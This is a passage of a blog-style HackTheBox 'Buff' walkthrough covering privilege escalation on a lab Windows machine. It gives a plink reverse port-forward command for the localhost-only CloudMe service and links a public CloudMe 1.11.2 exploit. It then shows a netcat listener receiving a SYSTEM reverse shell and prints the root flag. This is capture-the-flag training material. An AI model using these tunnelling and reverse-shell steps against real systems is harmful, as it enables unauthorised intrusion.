+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58490</span>      <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50676</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50809</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50879</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51491</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">6969</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51506</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51565</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">1122</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53167</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53191</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">5577</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8888</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53175</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53177</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">135</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">445</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">7680</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">8080</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49664</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49665</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49666</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49667</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49668</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49669</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">123</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5050</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5353</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5355</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">64168</span>          <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">137</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">138</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">1900</span>      <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">59086</span>     <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1900</span>         <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58106</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">59087</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">123</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5353</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5355</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">64168</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">1900</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">59085</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">1900</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">59084</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                  
+</code></pre></div></div>
+
+<h3 id="comparing-the-procress-with-all-the-procress-details">Comparing the procress with all the procress details..</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span><span class="n">powershell</span> <span class="n">ps</span>
+<span class="n">powershell</span> <span class="n">ps</span>
+
+<span class="no">Handles</span>  <span class="no">NPM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>    <span class="no">PM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>      <span class="no">WS</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>     <span class="no">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="no">Id</span>  <span class="no">SI</span> <span class="no">ProcessName</span>                                                  
+<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                  
+    <span class="mi">432</span>      <span class="mi">24</span>    <span class="mi">18324</span>       <span class="mi">9180</span>              <span class="mi">6612</span>   <span class="mi">1</span> <span class="no">ApplicationFrameHost</span>                                         
+    <span class="mi">161</span>      <span class="mi">10</span>     <span class="mi">1940</span>       <span class="mi">2176</span>              <span class="mi">7140</span>   <span class="mi">1</span> <span class="n">browser_broker</span>                                               
+    <span class="mi">237</span>      <span class="mi">19</span>    <span class="mi">26404</span>      <span class="mi">29328</span>              <span class="mi">5536</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
+    <span class="mi">286</span>      <span class="mi">62</span>    <span class="mi">30312</span>        <span class="mi">372</span>              <span class="mi">6088</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
+    <span class="mi">289</span>      <span class="mi">16</span>     <span class="mi">2896</span>       <span class="mi">2548</span>       <span class="mf">0.17</span>   <span class="mi">1396</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>                                                 
+    <span class="mi">269</span>      <span class="mi">16</span>     <span class="mi">2868</span>        <span class="mi">200</span>       <span class="mf">0.98</span>   <span class="mi">8772</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>      
+</code></pre></div></div>
+
+<p>This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software.</p>
+
+<p>This is conformed after finding <code class="language-plaintext highlighter-rouge">cloudme</code> is running in <code class="language-plaintext highlighter-rouge">Downloads</code> folder of <code class="language-plaintext highlighter-rouge">Shaun</code>.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span><span class="o">&gt;</span><span class="n">dir</span>
+<span class="n">dir</span>
+ <span class="no">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="no">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+ <span class="no">Volume</span> <span class="no">Serial</span> <span class="no">Number</span> <span class="n">is</span> <span class="no">A22D</span><span class="o">-</span><span class="mi">49</span><span class="no">F7</span>
+
+ <span class="no">Directory</span> <span class="n">of</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span>
+
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">05</span><span class="p">:</span><span class="mi">35</span>            <span class="mi">61</span><span class="p">,</span><span class="mi">440</span> <span class="n">nc</span><span class="p">.</span><span class="nf">exe</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">56</span>           <span class="mi">675</span><span class="p">,</span><span class="mi">752</span> <span class="n">plink</span><span class="p">.</span><span class="nf">exe</span>
+               <span class="mi">3</span> <span class="no">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="mi">18</span><span class="p">,</span><span class="mi">568</span><span class="p">,</span><span class="mo">016</span> <span class="n">bytes</span>
+               <span class="mi">2</span> <span class="no">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">9</span><span class="p">,</span><span class="mi">798</span><span class="p">,</span><span class="mi">672</span><span class="p">,</span><span class="mi">384</span> <span class="n">bytes</span> <span class="n">free</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="so-here-is-the-game-plan">So here is the game plan</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local</code></p>
+
+<h2 id="step-1">Step 1</h2>
+
+<h3 id="enable-sshd-service-on-your-kali-machine">Enable <code class="language-plaintext highlighter-rouge">sshd</code> service on your kali machine:</h3>
+<p><code class="language-plaintext highlighter-rouge">sudo systemctl start ssh.socket</code></p>
+
+<h2 id="step-2">Step 2</h2>
+<h3 id="use-plink-to-portforward-on-your-local-listener">Use <code class="language-plaintext highlighter-rouge">Plink</code> to portforward on your local listener</h3>
+
+<p><code class="language-plaintext highlighter-rouge">plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address}</code></p>
+
+<p>If every thing works correctly.. You should see this ..</p>
+
+<p><img src="/assets/img/sample/buff/buff6.png" alt="" /></p>
+
+<h2 id="cloudme-1112--cve--administrator">CloudMe 1.11.2 -CVE – Administrator:</h2>
+
+<p><code class="language-plaintext highlighter-rouge">Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389</code></p>
+
+<h3 id="the-shellcode-should-be-changed-in-order-to-get-the-reverse-shell">The shellcode should be changed in order to get the <code class="language-plaintext highlighter-rouge">reverse shell</code>.</h3>
+<hr />
+<hr />
+
+<h2 id="note">Note:</h2>
+
+<p><code class="language-plaintext highlighter-rouge"> Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time.</code></p>
+
+<hr />
+<h3 id="you-should-see-this-if-the-exploit-runs-correctly">you should see this if the exploit runs correctly.</h3>
+
+<p><img src="/assets/img/sample/buff/buff7.png" alt="" /></p>
+
+<p>Once Every this is set and run properly then you should be good to get the <code class="language-plaintext highlighter-rouge">reverse shell</code> and grab the <code class="language-plaintext highlighter-rouge">Root.txt</code></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">60000</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">60000</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.51</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">]</span> <span class="mi">49723</span>
+<span class="no">Microsoft</span> <span class="no">Windows</span> <span class="p">[</span><span class="no">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17134.1550</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+
+<span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+<span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+
+<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="mf">2e881649240</span><span class="n">e8868c48daee707659212</span>
+
+<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\
+</code></pre></div></div>
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#cve" class="page__taxonomy-item p-category" rel="tag">cve,</a><span class="sep">, </span>
+    
+      <a href="/tags/#portforwarding" class="page__taxonomy-item p-category" rel="tag">portforwarding</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows,</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-07-23T00:00:00+05:30">July 23, 2020</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Buff%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FBuff%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FBuff%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Buff/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/Blackfield/" class="pagination--pager" title="Hackthebox Blackfiled">Previous</a>
+    
+    
+      <a href="/otherposts/OSCP/" class="pagination--pager" title="My  journey  towards  “TRY  HARDER!”">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad-part3.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">https://dcodezero.github.io/</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/Buff/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Buff"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+  </body>
+</html>
